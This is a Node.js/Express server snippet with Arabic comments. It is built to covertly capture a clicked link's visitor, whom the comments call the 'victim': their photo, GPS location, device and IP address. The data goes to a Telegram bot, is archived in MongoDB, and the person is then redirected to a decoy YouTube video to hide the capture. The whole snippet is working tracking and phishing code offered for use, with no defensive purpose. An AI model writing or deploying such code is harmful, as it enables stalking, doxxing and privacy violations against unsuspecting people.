// ... الإعدادات السابقة (express, mongoose, axios) ...

// الرابط الحقيقي الذي تريد توجيه الضحية إليه (مثلاً فيديو تريند)
const REAL_DESTINATION = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 

app.get('/', (req, res) => {
    // إرسال صفحة الـ HTML التي تسحب البيانات أولاً
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/capture', async (req, res) => {
    try {
        const { image, location, device } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

        // إرسال البيانات فوراً لتيليجرام
        const mapUrl = location && location.lat ? `https://www.google.com/maps?q=${location.lat},${location.lon}` : "الموقع مرفوض";
        const message = `🔗 ضحية ضغط على الرابط!\n🌐 IP: ${ip}\n📱 الجهاز: ${device}\n📍 الموقع: ${mapUrl}`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });

        // حفظ في MongoDB كأرشيف
        const newData = new Victim({ ip, image, location });
        await newData.save();

        res.status(200).json({ redirect: REAL_DESTINATION }); // إرسال رابط التوجيه
    } catch (e) { res.status(500).send("Error"); }
});
